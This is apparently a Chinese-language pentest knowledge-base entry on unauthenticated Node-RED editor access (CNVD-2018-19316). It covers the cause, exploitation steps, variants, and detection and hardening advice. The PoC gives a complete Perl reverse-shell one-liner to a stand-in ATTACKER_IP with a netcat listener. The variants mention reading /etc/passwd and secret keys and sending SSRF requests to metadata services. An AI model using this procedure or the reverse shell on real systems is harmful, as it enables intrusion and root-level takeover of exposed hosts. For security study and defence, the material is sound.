---
id: web-nodejs-node-red-unauth-editor-inject-exec-rce
title: Node-RED 编辑器未授权访问：inject + exec 节点执行系统命令（CNVD-2018-19316）
type: scenario
domain: web
path: web/nodejs
technique: node-red-unauth-editor-inject-exec-rce
aliases:
- Node-RED 未授权 RCE
- CNVD-2018-19316
- Node-RED inject exec 节点
- /red/{id} 流程编辑器
- Node-RED getshell
- 物联网低代码平台命令执行
tags:
- web
- nodejs
- node-red
- rce
- unauth
- inject
- exec
- iot
- cnvd
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:18:03+08:00'
  notes: 已对照原文与图03-13核对；根路径POST返回/red/{id}、inject+exec节点部署触发、CNVD-2018-19316描述与root反弹均一致；原文未声明受影响版本区间，未设置versions；PoC未复跑
---

## 一句话结论

Node-RED 的流程编辑器（`http://target:1880/red/<id>/`）未配置任何认证时，任何能访问该端口的人都可以新建 `inject` → `exec` 节点流，把系统命令作为 exec 节点的命令内容，部署后触发 inject，命令即以 Node-RED 进程身份执行；原文在容器内直接拿到 root 反弹 Shell（对应 CNVD-2018-19316）。

## 原理

- Node-RED 是 Node.js 编写的物联网/低代码流程编排工具，默认监听 1880，流程编辑器与运行时 API 由同一进程提供。管理认证（`adminAuth`）不是强制项；未配置时编辑器与 `/flows`、`/nodes` 等接口对所有人开放。
- 访问根路径时，服务端会返回当前编辑器的访问路径信息，例如：
  ```json
  {"id":"ffec0b75777a00bc6e65ff2660896ad1","ip":"::ffff:10.10.16.38","path":"/red/{id}"}
  ```
  按返回的 `path` 访问 `/red/<id>/` 即可进入可视化编辑器。
- 编辑器自带 `inject`（触发器）与 `exec`（执行系统命令）节点。`inject` 节点可以配置为手动点击或定时触发；`exec` 节点把配置的命令交给子进程执行，并把 stdout/stderr 作为消息输出。把两者连线、部署（Deploy），再点击 inject 节点，就会执行命令。
- 因为命令执行发生在 Node-RED 服务进程的权限上下文中，容器部署时通常就是 root；即使不是 root，也能以应用账号执行任意命令、读取配置与凭据。
- CNVD-2018-19316 的描述指出 Node-RED 未强制身份验证，攻击者可通过组合特定 Flows 执行任意命令；同一入口还可滥用 `http request`、`file in`、`function` 等节点做 SSRF、本地文件读取与信息泄露。

## 触发条件

- 目标 1880 端口（或映射后的端口）可访问，Node-RED 编辑器未被防火墙限制。
- 未配置 `adminAuth`（或认证配置失效），`/red/<id>/` 与流程部署接口匿名可用。
- `exec` 节点未被禁用，进程对目标命令有执行权限。
- 攻击者能访问到编辑器返回的 `path` 或能枚举到 `/red/<id>/`。

## 利用步骤

1. 访问 `http://target:1880/`，若根路径返回 JSON 或错误提示，向根路径发送 POST/GET 获取 `path` 字段，得到 `/red/<id>`。
2. 浏览器打开 `http://target:1880/red/<id>/`，确认进入 Node-RED 编辑器且无需登录。
3. 从左侧节点面板拖入 `inject` 与 `exec`，将 inject 输出连到 exec 输入。
4. 双击 exec 节点，把命令内容设置为反弹 Shell 或任意命令（例如 `perl -e '...'` / `sh -c 'id'`），保存。
5. 点击右上角 Deploy 部署流程，再点击 inject 节点左侧的触发按钮，命令即执行。
6. 在攻击机监听对应端口接收反弹 Shell；确认权限（原文为 root）后继续信息收集或横向。

## PoC

```powershell
# 1. 获取编辑器路径（POST/GET 根路径）
curl -s -X POST http://target:1880/ | jq .
# {"id":"...","ip":"...","path":"/red/{id}"}

# 2. 访问 /red/<id>/ 进入编辑器后，新建 inject -> exec 流程
# exec 命令内容示例（Perl 反弹 Shell）：
perl -e 'use Socket;$i="ATTACKER_IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# 3. 攻击机监听
nc -lvnp 1234
```

部署并触发 inject 后，攻击机收到 Shell。原文的容器内用户为 root。

## 变体与关联

- 变体：用 `function` 节点执行任意 JavaScript（`require('child_process').exec(...)`）；用 `http request` 节点向 metadata 服务或内网接口发起请求做 SSRF；用 `file in` 节点读取 `/etc/passwd`、配置与密钥。
- 变体：若编辑器可访问但 UI 流程部署不便，可调用 Node-RED 的流程部署接口直接提交含 exec 节点的 JSON（需编辑器未认证）。
- 关联：Node.js 应用命令执行与沙箱逃逸 [[web-nodejs-n8n-authenticated-execute-command-workflow-rce]]、[[web-nodejs-vm2-buffer-slab-jwt-secret-leak]]；暴露的管理面板初始访问 [[pentest-initial-access-jdwp-exposed-jvm-debug-rce]]、[[pentest-initial-access-ray-dashboard-unauth-jobs-api-docker-sock-rce]]。
- 边界：配置了 `adminAuth`、仅监听 127.0.0.1、防火墙限制 1880、禁用 exec 节点或以低权限运行且无可用命令时，RCE 不成立。

## 检测与防御

- 检测：1880 端口对非管理网段开放；`/red/*` 出现匿名访问；Node-RED 进程异常派生 `sh`/`perl`/`nc` 子进程；流程目录（`~/.node-red/flows_*.json`）出现新增 exec 节点或未知流程。
- 修复：在 `settings.js` 配置 `adminAuth`（强口令/HTTPS），或把编辑器绑定到 127.0.0.1；删除/禁用 `exec` 节点，按需使用 `functionExternalModules` 等限制。
- 加固：防火墙仅允许管理网段访问 1880；以非 root 用户运行 Node-RED；监控流程变更与子进程创建；定期审计 flows 与已安装节点。
